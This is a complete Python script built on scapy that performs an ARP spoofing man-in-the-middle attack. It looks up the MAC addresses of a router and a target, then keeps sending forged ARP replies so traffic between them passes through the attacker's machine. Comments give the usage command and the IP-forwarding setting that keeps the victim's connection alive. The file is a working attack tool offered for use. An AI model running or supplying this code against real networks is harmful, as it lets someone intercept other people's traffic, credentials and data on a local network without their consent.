import scapy.all as scapy
import sys, time

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.Ether(dst=router_mac)/scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.sendp(packet1)
    scapy.sendp(packet2)


target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])

target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

# print(router_mac)
# print(target_mac)

#                        router ip  /  target ip
# sudo python s5_mitm.py 192.168.1.1 192.168.1.11

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)

# to keep the internet connection make that configuration as root:
# echo 1 >> /proc/sys/net/ipv4/ip_forward
